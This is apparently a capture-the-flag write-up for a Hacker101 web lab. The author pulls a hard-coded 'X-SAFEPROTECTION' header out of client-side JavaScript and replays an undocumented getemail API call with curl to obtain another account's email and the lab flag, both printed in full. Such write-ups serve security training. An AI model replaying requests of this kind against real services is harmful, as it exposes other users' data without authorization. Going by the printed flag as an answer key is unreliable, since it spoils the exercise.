Taking a look at the source code i notice it has some `.js` files. Looking at `custom.js` i copy the code and put it into an online beautifier to make it more readable. It has two interesting functions: `edit-profile` and `retrieve-email`. I'll explore these further with burp. 

_Tip: I can easily access this by using developer tools and looking in the debugger section in firefox._

```js
function editProfile(e) {
    var t = new XMLHttpRequest;
    t.open("POST", "api/action.php?act=editbio", !0), t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), t.setRequestHeader("X-SAFEPROTECTION", "enNlYW5vb2Zjb3Vyc2U="), t.onreadystatechange = function() {
        this.readyState === XMLHttpRequest.DONE && this.status
    }, t.send("bio=" + encodeURI(msg))
}

function retrieveEmail(e) {
    var t = new XMLHttpRequest;
    t.open("GET", "api/action.php?act=getemail", !0), t.setRequestHeader("X-SAFEPROTECTION", "enNlYW5vb2Zjb3Vyc2U="), t.onreadystatechange = function() {
        this.readyState === XMLHttpRequest.DONE && this.status
    }, t.send()
}
```

`"POST", "api/action.php?act=editbio"`

`"GET", "api/action.php?act=getemail"`

- Adding `api/action.php?act=getemail` to the original URL seemed to do nothing for me;
- Adding `&& console.log(t.responseText)` to the `onreadystatechange` function:

```js
var t=new XMLHttpRequest;
t.open("GET","api/action.php?act=getemail",!0)
t.setRequestHeader("X-SAFEPROTECTION","enNlYW5vb2Zjb3Vyc2U=")
t.onreadystatechange = function(){ 
    this.readyState === XMLHttpRequest.DONE && this.status && console.log(t.responseText) 
}
t.send()
```

I manage to use curl to get the account details:

```php
curl 'https://f2388ebb4728670b08997ed7a6301d7a.ctf.hacker101.com/api/action.php?act=getemail' --http1.1 -H 'X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=' 
```

- Custom header `-H`
- Specify http version `--http1.1`

`{'email':'zseano@ofcourse.com','flag':'^FLAG^cd0505fb79adfafc334103fada02109a54e285eeeae580dbac815e475a33be44$'}`

**Flag:**

`^FLAG^cd0505fb79adfafc334103fada02109a54e285eeeae580dbac815e475a33be44$'`

---

**Completed:** _09:41 2024-09-07_

